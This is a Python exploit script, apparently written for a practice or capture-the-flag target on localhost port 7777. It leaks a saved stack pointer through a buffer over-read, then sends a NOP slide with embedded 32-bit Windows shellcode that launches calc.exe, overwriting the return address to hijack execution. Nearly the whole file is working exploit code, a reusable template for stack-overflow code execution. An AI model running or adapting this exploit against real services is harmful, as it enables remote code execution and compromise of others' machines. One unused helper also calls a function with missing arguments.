import socket
import struct
import time
shellcode = b"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
shellcode += b"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
shellcode += b"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
shellcode += b"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
shellcode += b"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
shellcode += b"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
shellcode += b"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
shellcode += b"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
shellcode += b"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
shellcode += b"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
shellcode += b"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
shellcode += b"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
shellcode += b"\x52\xff\xd0"

def array_division(arr, start_idx, end_idx=None):
    if end_idx == None:
        e_idx = len(arr)-1
    else:
        e_idx = end_idx
    new_arr = []
    i = start_idx
    while i <= e_idx:
        new_arr.append(arr[i])
        i += 1
    return new_arr

def leak_stack_buf_offset(sock, start_payload, buf_size, offset):
    payload = start_payload
    payload += b"B"*offset
    sock.send(payload)

    resp = sock.recv(buf_size+offset+4)
    #print(resp)
    #print(len(resp))
    leaked_bytes = bytes(array_division(resp, buf_size+offset, len(resp)-1))
    leak = leaked_bytes + b"\x00"*(4 - len(leaked_bytes))

    leaked_addr = struct.unpack("I", leak)[0]
    return leaked_addr

def leak_stack_from_buf():
    i = 0

    while 1:

        sock = socket.socket()
        sock.connect(("127.0.0.1", 7777))
        
        #print("At buffer + "+str(i))
        addr = leak_stack_buf_offset(sock, i)
        
        print(hex(addr))
        
        sock.close()
        input()
        i += 4
        
#leak_stack_from_buf()

BUF_SIZE = 1024

sock = socket.socket()
sock.connect(("127.0.0.1", 7777))

pay = b"\x90"*(BUF_SIZE - len(shellcode))
pay += shellcode

ebp_save = leak_stack_buf_offset(sock, pay, BUF_SIZE, 8)
print("EBP save : "+hex(ebp_save))
sock.close()

in_nopslide_addr = ebp_save-512
print("Address in NOPSLIDE : "+hex(in_nopslide_addr))

sock = socket.socket()
sock.connect(("127.0.0.1", 7777))

pay = b"\x90"*(BUF_SIZE - len(shellcode) - 32)
pay += shellcode
pay += b"\x90"*32
pay += b"B"*4 # Data
pay += b"B"*4 # Data save
pay += struct.pack("I", ebp_save)
pay += struct.pack("I", in_nopslide_addr)

print(len(pay))

print(pay)

time.sleep(1)

sock.send(pay)

sock.close()